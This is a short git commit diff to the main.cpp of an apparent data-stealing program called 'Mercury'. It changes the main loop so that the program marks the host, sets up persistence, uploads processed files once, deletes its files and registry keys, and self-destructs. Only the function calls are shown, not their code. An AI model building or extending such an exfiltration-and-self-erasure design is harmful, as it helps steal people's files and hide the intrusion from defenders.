c810eaa9605b051007a5db46d8a685027236ee9c
0xConstant <noroh4xy@protonmail.com>
2023-10-01 13:07:00 -0700

    added one-time-run boolean and Cleanup function to delete all files and registry keys

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -1,15 +1,25 @@
 #include "Core/upload.hpp"
+#include "Core/self_destruct.hpp"
+#include "Core/mark_machine.hpp"
+#include "Core/persistence.hpp"
+
+
+constexpr bool ONETIMERUN = true;
 
 
 int main() {
-    while (true) {
-        std::cout << "Starting file process and upload..." << std::endl;
+    MarkMachine();
+    PersistOnMachine();
+    if (ONETIMERUN) {
+        
         ProcessFilesAndUpload();
-        std::cout << "Sleeping for 30 seconds..." << std::endl;
-        std::this_thread::sleep_for(std::chrono::seconds(30));
+        std::cout << "Beginning cleanup..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        Cleanup();
+        std::this_thread::sleep_for(std::chrono::seconds(3));
+        SelfDestruct();
     }
     
-
     return 0;
 }
 
